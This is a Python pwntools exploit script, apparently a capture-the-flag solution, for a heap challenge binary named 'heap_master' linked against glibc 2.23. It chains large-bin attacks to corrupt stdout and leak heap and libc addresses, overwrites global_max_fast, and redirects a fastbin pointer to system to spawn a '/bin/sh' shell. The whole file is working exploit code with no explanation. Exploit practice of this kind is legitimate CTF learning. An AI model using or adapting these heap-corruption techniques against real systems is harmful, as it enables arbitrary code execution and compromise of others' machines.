from pwn import *

elf = ELF('./heap_master')
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'

def add(size):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('size: ', str(size))

def edit(off,cont):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('offset: ', str(off))
    p.sendlineafter('size: ', str(len(cont)))
    p.sendafter('content: ', cont)

def delete(off):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('offset: ', str(off))

def exp():
    edit(0x108,p64(0x401))      #fake first large chunk
    edit(0x508,p64(0x21))
    edit(0x528,p64(0x21))
    delete(0x110)
    add(0x400)

    edit(0x608,p64(0x411))
    edit(0x608+0x410,p64(0x21))
    edit(0x608+0x430,p64(0x21))
    delete(0x610)
    edit(0x118,p16(0x2610))     #modify stdout_flag --> mmap_addr
    add(0x410)

    edit(0x1008,p64(0x451))     #fake second large chunk
    edit(0x1458,p64(0x21))
    edit(0x1478,p64(0x21))
    delete(0x1010)
    add(0x450)

    edit(0x1508,p64(0x461))
    edit(0x1968,p64(0x21))
    edit(0x1988,p64(0x21))
    delete(0x1510)
    edit(0x1018,p16(0x2629))    #modify io_write_base_one_byte --> '\x00'
    add(0x460)

    data = p.recv(8,timeout=1)
    if data == '' or data[0] == '=' :
        raise NameError
    else :
        pass
    p.recv(24)
    data1 = u64(p.recv(8))
    data2 = u64(p.recv(6).ljust(8,'\x00'))
    heap_base = data1 - 3584
    libc_base = data2 - 3954339
    system_addr = libc_base + libc.symbols['system']
    bin_addr = libc_base + libc.search('/bin/sh').next()

    edit(0x2008,p64(0x501))    #fake third large chunk
    edit(0x2508,p64(0x21))
    edit(0x2528,p64(0x21))
    delete(0x2010)
    add(0x500)

    edit(0x2608,p64(0x511))
    edit(0x2b18,p64(0x21))
    edit(0x2b38,p64(0x21))
    delete(0x2610)
    edit(0x2018,p16(0x37e8))    #modify global_max_fast
    add(0x510)

    edit(0x3008,p64(0x3921))
    edit(0x3008+0x3920,p64(0x21))
    delete(0x3010)
    edit(0x3010,p64(system_addr))#modify fastbin->fd --> system
    add(0x3918)
    #gdb.attach(p)

    edit(0x4008,p64(0x21))
    edit(0x4010,'/bin/sh')
    edit(0x4028,p64(0x21))
    delete(0x4010)

    p.interactive()

if __name__ == '__main__' :
    pd = 1
    while pd:
        try :
            p = process('./heap_master')
            exp()
            pd = 0
        except Exception as e:
            print e
            p.close()
        pass
